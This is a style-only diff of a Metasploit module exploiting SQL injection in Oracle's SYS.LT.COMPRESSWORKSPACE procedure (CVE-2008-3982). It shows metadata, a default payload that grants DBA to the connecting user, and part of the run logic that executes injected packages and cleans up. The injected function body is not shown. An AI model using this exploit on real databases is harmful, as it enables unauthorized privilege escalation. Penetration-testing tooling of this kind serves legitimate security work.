@@ -7,33 +7,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE',
-      'Description'    => %q{
-        This module exploits an sql injection flaw in the COMPRESSWORKSPACE
-        procedure of the PL/SQL package SYS.LT. Any user with execute
-        privilege on the vulnerable package can exploit this vulnerability.
-      },
-      'Author'         => [ 'CG' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE',
+        'Description' => %q{
+          This module exploits an sql injection flaw in the COMPRESSWORKSPACE
+          procedure of the PL/SQL package SYS.LT. Any user with execute
+          privilege on the vulnerable package can exploit this vulnerability.
+        },
+        'Author' => [ 'CG' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2008-3982'],
           [ 'OSVDB', '49324'],
           [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ]
         ],
-      'DisclosureDate' => '2008-10-13'))
+        'DisclosureDate' => '2008-10-13'
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ])
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execte.', "GRANT DBA to #{datastore['DBUSER']}"]),
+      ]
+    )
   end
 
   def run
     return if not check_dependencies
 
-    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
+    name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     cruft = Rex::Text.rand_text_alpha_upper(1)
 
     function = "
@@ -61,14 +65,13 @@ class MetasploitModule < Msf::Auxiliary
     begin
       prepare_exec(package1)
       prepare_exec(package2)
-    rescue  => e
-      if ( e.to_s =~ /No Data/ )
+    rescue => e
+      if (e.to_s =~ /No Data/)
         print_status("Removing function '#{cruft}'...")
         prepare_exec(clean)
       else
         return
       end
     end
-
   end
 end
